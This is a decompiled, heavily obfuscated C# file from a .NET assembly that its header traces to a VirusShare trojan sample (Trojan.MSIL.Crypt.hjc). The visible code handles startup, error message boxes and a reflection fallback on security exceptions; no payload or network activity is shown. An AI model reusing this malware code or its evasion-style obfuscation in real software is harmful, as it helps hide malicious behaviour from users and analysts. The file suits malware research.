// Decompiled with JetBrains decompiler
// Type: .
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=cab8849a7bf7875b
// MVID: B8136FDA-4EB0-4CA7-9502-281BC34A634B
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hjc-f20e5d33e431ce6f4aedcb085c959ae1bda3809f8f5bbdd4d18dd58683a28d4d.exe

using \u0001;
using \u0003;
using \u0004;
using \u0005;
using \u0008;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;

namespace \u000F
{
  internal class \u0004 : \u0004.\u0004
  {
    [NonSerialized]
    internal static \u0007.\u0003 \u001A;

    protected override void \u0001([In] \u0002 obj0)
    {
      do
      {
        \u0010 obj = new \u0010(obj0);
        try
        {
          int num = (int) \u0080.\u007E\u001E\u0002((object) obj);
        }
        finally
        {
          if (obj != null)
            \u0014.\u007E\u0016((object) obj);
        }
      }
      while (false);
    }

    protected override void \u0001([In] \u0002 obj0)
    {
      do
      {
        if (true)
          goto label_8;
label_7:
        continue;
label_8:
        \u0001.\u000F obj = new \u0001.\u000F((\u0004.\u0004) this, obj0);
        try
        {
          do
          {
            do
            {
              int num = (int) \u0080.\u007E\u001E\u0002((object) obj);
            }
            while (false);
          }
          while (false);
          goto label_7;
        }
        finally
        {
          if (obj != null)
            \u0014.\u007E\u0016((object) obj);
        }
      }
      while (false);
    }

    protected override void \u0001([In] \u0002 obj0)
    {
      int num = (int) \u0004\u0004.\u001F\u0006(\u0018.\u007E\u0005\u0002((object) obj0.\u0001), \u0081\u0002.\u008D\u0004(\u000F.\u0004.\u001A(6780), (object) \u000F.\u0004.\u001A(2490)), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    public static bool \u0001()
    {
      bool flag;
      try
      {
        \u0012.\u0001((\u0004.\u0004) new \u000F.\u0004());
        do
        {
          flag = true;
        }
        while (false);
      }
      catch (SecurityException ex1)
      {
        try
        {
          try
          {
            // ISSUE: type reference
            object obj = \u0005\u0004.\u007F\u0006((object) \u0095.\u0007\u0003(__typeref (Application)), \u000F.\u0004.\u001A(6809), BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
          }
          catch (MissingMethodException ex2)
          {
          }
          \u0010 obj1 = new \u0010(new \u0002(\u0081\u0002.\u008D\u0004(\u000F.\u0004.\u001A(6834), (object) \u000F.\u0004.\u001A(2490)), false));
          \u0081.\u007E\u0084\u0002((object) obj1, true);
          int num = (int) \u0080.\u007E\u001E\u0002((object) obj1);
        }
        catch (Exception ex3)
        {
          int num = (int) \u0004\u0004.\u001F\u0006(\u0018.\u007E\u0005\u0002((object) ex3), \u0081\u0002.\u008D\u0004(\u000F.\u0004.\u001A(6780), (object) \u000F.\u0004.\u001A(2490)), MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        flag = false;
      }
      return flag;
    }

    static \u0004() => \u0002.\u0001(typeof (\u000F.\u0004));
  }
}
